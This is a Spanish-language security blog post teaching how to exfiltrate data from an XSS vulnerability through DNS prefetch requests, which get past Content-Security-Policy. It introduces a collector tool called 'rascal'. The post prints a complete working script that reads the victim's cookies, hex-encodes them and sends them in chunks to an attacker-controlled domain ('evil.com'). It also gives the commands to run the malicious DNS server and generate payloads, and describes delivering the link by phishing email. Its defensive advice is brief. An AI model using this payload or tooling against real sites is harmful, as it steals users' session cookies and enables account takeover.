---
title: "Exfiltración DNS para XSS con rascal"
author: Jose M
classes: wide
excerpt: "Hola chicos! Hoy os vamos a traer un poco de ¡exfiltración DNS para XSS con rascal!. Esta técnica nos permitirá extraer datos a partir de una vulnerabilidad XSS que nos será especialmente útil cuando nos encontramos con políticas de CSP muy restrictivas o para cuando no queremos hacer mucho ruido"
categories:
  - Herramientas
tags:
  - xss
  - csp
  - exfiltracion
  - dns
---
Hola chicos! Hoy os vamos a traer un poco de ¡exfiltración DNS para XSS con rascal!. Esta técnica nos permitirá extraer datos a partir de una [vulnerabilidad XSS](https://donttouchmy.net/introduccion-ataques-xss/) que nos será especialmente útil cuando nos encontramos con políticas de CSP muy restrictivas o para cuando no queremos hacer mucho ruido ![🙂](https://s.w.org/images/core/emoji/13.0.1/svg/1f642.svg)

Primero, para los que no lo sepáis, [CSP](https://en.wikipedia.org/wiki/Content_Security_Policy) es una tecnología por la cual el servidor web le comunica al cliente (al navegador web), desde donde está permitido cargar recursos para la página web que se está sirviendo. Esto se hace mediante las cabeceras Content-Security-Policy. 

Habilitar CSP puede poner las cosas difíciles al atacante y restringir la explotación de una vulnerabilidad de XSS, ya que le impide a éste cargar contenido desde servidores no confiables o incluso, limitamos los canales de exfiltración de datos.

Desgraciadamente para los administradores de sistemas y para los desarrolladores, CSP no es infalible y falla especialmente a la hora de proteger al cliente en éste último punto. La exfiltración.

Estas, entre otras, son técnicas contra las que CSP no puede proteger a los usuarios una vez se ha conseguido explotar un XSS:

-   DNS Prefetch
-   PostMessage
-   3rd party scripts

En este primer post, vamos a ver cómo exfiltrar datos mediante DNS Prefetch. 

El escenario de ataque es el siguiente:

-   Navegador cliente (Víctima)
-   Aplicación Web\
    Dirección: http://csp.local\
    Cabecera CSP:  «default-src 'self' csp.local 'unsafe-inline';»
-   Servidor DNS malicioso

Exfiltración DNS? Cómo? Como algunos sabréis, los navegadores incorporan una funcionalidad que se llama *Prefetch*, que permite precargar un recurso que sabemos que vamos a utilizar después para agilizar la carga de la página. Uno de los recursos que podemos precargar son las resoluciones DNS.

<link rel="dns-prefetch" ref="http://evil.local"/>

Pues vamos a utilizar esto en nuestro ataque XSS para bypassear a CSP ya que las políticas CSP no afectan a las peticiones DNS. 

El código JS simple que vamos a incrustar va a ser este:

d=document;l=d.createElement('link');l.rel='dns-prefetch';l.href='http://xxx.evil.local/malacatones';h=d.getElementsByTagName('head')[0];h.appendChild(l)

[![Prueba de exfiltración DNS mediante etiqueta LINK](https://donttouchmy.net/wp-content/uploads/2019/01/Screenshot-2019-01-21-at-08.29.25-1024x737.png)](https://donttouchmy.net/wp-content/uploads/2019/01/Screenshot-2019-01-21-at-08.29.25.png)

Bien, no? Pero hay varios problemas que tendremos que solucionar para que esto sea funcional:

-   Cantidad de información\
    **Sólo podemos pasar 63 caracteres** por cada subdominio. En muchos casos esto no será suficiente para exfiltrar datos correctamente. Las cookies pueden ocupar mucho más.
-   Codificación\
    Al contrario que exfiltrando por HTTP, en DNS tenemos un set limitado de caracteres que podemos utilizar. Si usamos caracteres no permitidos, el navegador no realizará la query. 
-   Sesión\
    Deberíamos ser capaces de relacionar las llamadas de una sesión para poder concatenar datos

Con esto, sabemos que debemos codificar el output para poder pasar cualquier tipo de carácter y esta salida debe dividirse para enviarla mediante varias peticiones.

### Codificación

En cuanto a la codificación, el navegador parece que soporta Base64 y hexadecimal por defecto(sin cargar librerías externas). Después de probar con base64, nos dimos cuenta que no era posible ya que base64 es case sensitive y las queries DNS que realiza el navegador, no tienen por que llegar así al servidor remoto. Así pues, cambiamos a hexadecimal que es más simple todavía.

Ahora por cada carácter del contenido que queremos, debemos extraer

contenido.charCodeAt(x).toString(16)

[![String to hexadecimal](https://donttouchmy.net/wp-content/uploads/2019/01/Screenshot-2019-01-21-at-20.04.02-1024x285.png)](https://donttouchmy.net/wp-content/uploads/2019/01/Screenshot-2019-01-21-at-20.04.02.png)

Como véis, esto tiene un problema. «\n» por ejemplo, resuelve con «a» quitando el «0» inicial, lo cual hará que nuestra string hexadecimal quede corrupta. Para solucionarlo, usamos padding con zeros:

caracter = contenido.charCodeAt(x).toString(16).padStart(2,0)

[![String to hexadecimal con padding de 0](https://donttouchmy.net/wp-content/uploads/2019/01/Screenshot-2019-01-21-at-20.06.11-1024x84.png)](https://donttouchmy.net/wp-content/uploads/2019/01/Screenshot-2019-01-21-at-20.06.11.png)

### Concatenación

Otro problema que no teníamos contemplado fue que la concatenación mediante '+' no funcionaba (al menos en Firefox) ya que el propio navegador sanitizaba este carácter de la URL en la respuesta.

[![Test XSS Simple ](https://donttouchmy.net/wp-content/uploads/2019/01/Screenshot-2019-01-18-at-08.24.10.png)\
](https://donttouchmy.net/wp-content/uploads/2019/01/Screenshot-2019-01-18-at-08.24.10.png)

[![XSS: Concatenación con + no funciona](https://donttouchmy.net/wp-content/uploads/2019/01/Screenshot-2019-01-18-at-08.24.19.png)](https://donttouchmy.net/wp-content/uploads/2019/01/Screenshot-2019-01-18-at-08.24.19.png)

Pero como siempre, hay una manera de bypassar la restricción... .concat()

[![XSS: Ejecución de XSS de test](https://donttouchmy.net/wp-content/uploads/2019/01/Screenshot-2019-01-18-at-20.40.05-1024x429.png)](https://donttouchmy.net/wp-content/uploads/2019/01/Screenshot-2019-01-18-at-20.40.05.png)[![XSS: solución a concatenación](https://donttouchmy.net/wp-content/uploads/2019/01/Screenshot-2019-01-18-at-20.40.24.png)](https://donttouchmy.net/wp-content/uploads/2019/01/Screenshot-2019-01-18-at-20.40.24.png)

Perfecto.

### Sesión y limite de caracteres

El último problema fue que sólo teníamos 63 caracteres como máximo para exfiltrar datos. **Estos 63 caracteres vienen** dados de que el protocolo DNS sólo permite 63 caracteres por subdominio. Así pues, para poder exfiltrar cadenas de texto mayores a 63 caracteres, necesitamos un *loop *que construya e inyecte tantos tag *<label>* como sea necesario. 

Además, tenemos que poder relacionar las llamadas DNS relativas a una misma ejecución. Para este punto con generar una string aleatoria de sesión deberíamos tener suficiente. 

BRBRRBRBRBRBRBR!

[![XSS DNS Exfiltrator](https://donttouchmy.net/wp-content/uploads/2019/01/Cool-Painted-Kitchen-Aid-Mixer-Art1-240x300.jpg)](https://donttouchmy.net/wp-content/uploads/2019/01/Cool-Painted-Kitchen-Aid-Mixer-Art1.jpg)

DING!

<script>t=40;dm='evil.com';k2="-xss1";d=document;c=d.cookie;function v(dm, d, c){m="";for(var x in c){k=Math.random().toString(36).substring(7);m=m.concat(c.charCodeAt(x).toString(16).padStart(2,0))};iter=[];p=0;x=0;it=(m.length/t);for(i=[];i.length<=it;){i.push(1);iter.push(m.slice(iter.length*t,i.length*t));};for(var o in iter){l=d.createElement('link');l.rel='dns-prefetch';l.href='http://XXX3.YYY3.SESSION3.DOMAIN'.replace('XXX3',iter[o]).replace('YYY3',o).replace('SESSION3',k.concat(k2)).replace('DOMAIN',dm);h=d.getElementsByTagName('head')[0];h.appendChild(l);};};v(dm,d,c)</script>

Si hacemos una prueba manual, veréis cómo inyectamos varias cabeceras <link> al cargar la página. 

Servidor DNS
------------

Ahora tenemos que recoger los datos. En un primer momento pensamos en usar BIND o PowerDNS para recuperar la información de los logs, pero esto puedes ser más complejo y, por supuesto, no es un proceso rápido. 

Hay varios proyectos de exfiltración por DNS que permite recuperar archivos, montar túneles y demás que seguro funcionan de vicio, pero no hay ninguno pensado para exfiltración desde clientes Web. Así que hemos creado uno! ![🙂](https://s.w.org/images/core/emoji/13.0.1/svg/1f642.svg)

Podéis descargarlo desde [Github](https://github.com/gum0x/rascal).

De momento consta de dos partes. El servidor DNS, que guardará las llamadas decodificadas en una base de datos SQLite, y el cliente, que nos mostrará los datos agrupados y nos ayudará a generar el payload que hemos trabajado en los pasos anteriores. 

**Nota:** tened en cuenta que necesitáis un dominio configurado para apuntar al servidor donde levantaremos nuestro DNS malicioso, para que las peticiones DNS de nuestro dominio malicioso le lleguen.  

#### Arrancar el servidor

Primero de todo, cread la base de datos SQLite.

sqlite3 xss.db < init.sql

Antes de de nada, de momento el servidor es compatible sólo con *python2 (en un futuro será compatible con python3)* y require de las librerías *dnslib* que podéis instalar mediante *pip. *Tenéis el archivo *requeriments.txt *en el repo.

Para arrancar el servidor hacemos:  

python rascal.py --db /tmp/xss.db --domain evil.local -i "*.evil.local IN A 10.22.3.66"

Donde* --domain * es el dominio que queremos capturar, *-i* es el *registro de zona *que vamos a utilizar para resolver y finalmente *--db *que es el archivo *sqlite * donde vamos a volcar los datos exfiltrados. 

[![Query de prueba contra rascal](https://donttouchmy.net/wp-content/uploads/2019/01/Screenshot-2019-01-20-at-22.43.36-1-1024x204.png)](https://donttouchmy.net/wp-content/uploads/2019/01/Screenshot-2019-01-20-at-22.43.36-1.png)

Ya tenemos *rascal* listo!

### Generar payload

Con *rascalcl *podemos generar el payload.

python rascalcl.py --code -d evil.local --maxchar 10 -s demo01

Donde *-d* es el dominio de nuestros servidor DNS malicioso, *--maxchar* el número de caractéres máximos de cada elemento *link* utilizado y finalmente* -s *que es la etiqueta que queremos concatenar a la sesión. Así podremos categorizar las exfiltraciones por «campañas» dentro de la misma base de datos. 

[![XSS: Crear payload con rascal](https://donttouchmy.net/wp-content/uploads/2019/01/rascalcl_create_payload.jpg)](https://donttouchmy.net/wp-content/uploads/2019/01/rascalcl_create_payload.jpg)

Con este payload, construímos un link de XSS que insertaremos en un email de phishing o en una página web maliciosa.

[![Página maliciosa con link XSS](https://donttouchmy.net/wp-content/uploads/2019/01/mpv-shot0019-copy.jpg)](https://donttouchmy.net/wp-content/uploads/2019/01/mpv-shot0019-copy.jpg)

Ahora sólo tenemos que esperar a que los atacantes le den click al link e ir recogiendo la información en nuestro servidor DNS. 

### Ataque y recuperación de datos

Una vez hemos recolectado los datos del ataque mediante nuestro servidor *rascal, *podemos recuperar los datos con *rascalcl.*

python rascalcl.py -g --db /tmp/xss.db

[![rascalcl - printando la información obtenida](https://donttouchmy.net/wp-content/uploads/2019/01/mpv-shot0048.jpg)](https://donttouchmy.net/wp-content/uploads/2019/01/mpv-shot0048.jpg)

Os dejo un video del ataque donde veremos a la víctima clicando en el payload malicioso y cómo lo capturamos con *rascalcl*.

### ¿Y ahora qué? ¿Cómo bloqueo la exfiltración?

Pues, ahora... nada ![🙂](https://s.w.org/images/core/emoji/13.0.1/svg/1f642.svg) 

Medidas de seguridad:

1.  Evitar XSS en nuestro código
2.  Evitar ataques XSS en nuestras aplicaciones
3.  Eliminar XSS de nuestras aplicaciones...
4.  Cortarle los dedos a los desarrolladores que no ***validen los inputs*** de nuestras aplicaciones web
5.  ...

Como hemos visto, es bastante difícil evitar la exfiltación así que nuestra máxima prioridad siempre tiene que ser evitar vulnerabilidades XSS con buenas prácticas de desarrollo y adicionalmente podemos utilizar tecnologías que nos** ayuden** a evitar la ejecución de código no autorizado tales como: SRI,  nounce o el mismo CSP con políticas más restrictivas que eviten cargar contenido en línea.

Desgraciadamente, estas tecnologías pueden ser difíciles de implementar por que requieren adaptaciones tanto en el software que desarrollamos como en la metodología de los desarrolladores.

Y con esto ya tenemos la primera parte técnica de exfiltración para XSS.

Os esperamos en la segunda!